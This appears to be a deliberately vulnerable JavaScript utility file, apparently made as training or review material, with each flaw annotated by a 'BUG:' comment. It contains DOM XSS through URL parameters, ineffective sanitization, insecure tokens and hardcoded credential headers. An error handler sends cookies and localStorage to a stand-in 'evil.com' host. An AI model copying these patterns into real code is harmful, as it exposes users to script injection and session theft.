// BUG: No strict mode, everything global

// ============================================================
// BUG: XSS helper functions
// ============================================================

// BUG: "Sanitize" function that does nothing useful
function sanitizeInput(input) {
    // BUG: Incomplete sanitization - only removes <script> but not other XSS vectors
    return input.replace(/<script>/gi, '').replace(/<\/script>/gi, '')
    // BUG: Doesn't handle <img onerror>, <svg onload>, event handlers, etc.
}

// BUG: URL parameter reading with no sanitization
function getUrlParam(name) {
    // BUG: Using deprecated escape/unescape instead of encodeURIComponent
    var results = new RegExp('[\\?&]' + name + '=([^&#]*)').exec(window.location.href)
    return results ? unescape(results[1]) : null  // BUG: unescape is deprecated
}

// BUG: Renders URL params directly into the page
function renderUrlParams() {
    params = new URLSearchParams(window.location.search)  // BUG: Global variable
    params.forEach(function(value, key) {
        // BUG: DOM XSS - rendering URL parameters as HTML
        document.body.innerHTML += '<div class="param">' + key + ' = ' + value + '</div>'
    })
}

// ============================================================
// BUG: Broken crypto utilities
// ============================================================

// BUG: "Random" number generator that isn't random
function generateSecureToken(length) {
    // BUG: Math.random() is NOT cryptographically secure
    token = ''  // BUG: Global variable
    chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    for (i = 0; i < length; i++) {  // BUG: Global i variable
        token += chars.charAt(Math.floor(Math.random() * chars.length))
    }
    return token
}

// BUG: Storing generated tokens globally
generatedTokens = []  // BUG: All tokens accessible via console

function generateAndStoreToken() {
    t = generateSecureToken(32)
    generatedTokens.push(t)
    console.log('Generated token:', t)  // BUG: Logging tokens
    return t
}

// ============================================================
// BUG: Terrible date/number formatting
// ============================================================

// BUG: Doesn't handle edge cases, wrong logic
function formatCurrency(amount) {
    // BUG: Floating point arithmetic
    tax = amount * 0.1 + amount * 0.05 + amount * 0.02  // BUG: Global, floating point errors
    total = amount + tax
    // BUG: toFixed returns string, then doing math on it later
    return '$' + total.toFixed(2)
}

// BUG: Redeclared function (shadows the one in app.js too)
function formatDate(date) {
    // BUG: Doesn't check if date is valid
    // BUG: Month is 0-indexed but not handled
    return date.getDay() + '/' + date.getMonth() + '/' + date.getYear()
    // BUG: getDay() returns day of week (0-6), not day of month
    // BUG: getYear() is deprecated, returns year - 1900
    // BUG: getMonth() is 0-indexed
}

// ============================================================
// BUG: Insecure data storage
// ============================================================

function saveToLocalStorage(key, value) {
    // BUG: No encryption, stores anything including sensitive data
    localStorage.setItem(key, typeof value === 'object' ? JSON.stringify(value) : value)
    // BUG: Logging what's being stored
    console.log('Saved to localStorage:', key, value)
}

function loadFromLocalStorage(key) {
    value = localStorage.getItem(key)  // BUG: Global variable
    // BUG: Tries to JSON.parse everything without try/catch
    return JSON.parse(value)  // Throws on non-JSON strings
}

// ============================================================
// BUG: Terrible HTTP helpers
// ============================================================

// BUG: Credentials sent with every request
function apiRequest(method, path, data) {
    xhr = new XMLHttpRequest()  // BUG: Global variable
    xhr.open(method, API_URL + path, false)  // BUG: Synchronous request blocks UI

    // BUG: Sending credentials with every request
    xhr.setRequestHeader('X-API-KEY', API_KEY)
    xhr.setRequestHeader('Authorization', 'Basic ' + btoa(ADMIN_USER + ':' + ADMIN_PASS))

    if (data) {
        xhr.setRequestHeader('Content-Type', 'application/json')
        xhr.send(JSON.stringify(data))
    } else {
        xhr.send()
    }

    // BUG: No status code check
    return JSON.parse(xhr.responseText)  // BUG: No try/catch, crashes on non-JSON
}

// BUG: JSONP implementation (inherently insecure)
function jsonpRequest(url, callback) {
    // BUG: JSONP allows arbitrary script execution
    script = document.createElement('script')  // BUG: Global variable
    callbackName = 'jsonp_' + Math.random().toString(36).substr(2)  // BUG: Global
    window[callbackName] = function(data) {
        callback(data)
        // BUG: Never cleans up the global callback or script element
    }
    script.src = url + '?callback=' + callbackName  // BUG: XSS via JSONP
    document.body.appendChild(script)
}

// ============================================================
// BUG: Error "handling" that exposes everything
// ============================================================

window.onerror = function(message, source, lineno, colno, error) {
    // BUG: Sending all error details to an external endpoint
    errorData = {  // BUG: Global variable
        message: message,
        source: source,
        line: lineno,
        column: colno,
        stack: error ? error.stack : 'N/A',
        url: window.location.href,
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString()
    }

    // BUG: Sending error data including cookies to external service over HTTP
    new Image().src = 'http://error-tracking.evil.com/log?data=' + encodeURIComponent(JSON.stringify(errorData))

    // BUG: Also logging full error to console
    console.error('Full error details:', errorData)

    // BUG: Showing raw error to user
    alert('Error: ' + message + '\nFile: ' + source + '\nLine: ' + lineno)

    return false  // BUG: Doesn't prevent default error handling
}

// ============================================================
// BUG: Utilities that execute immediately
// ============================================================

// BUG: Auto-render URL params on load (DOM XSS)
renderUrlParams()

// BUG: Log all cookies on script load
console.log('Current cookies:', document.cookie)
console.log('Current localStorage:', JSON.stringify(localStorage))
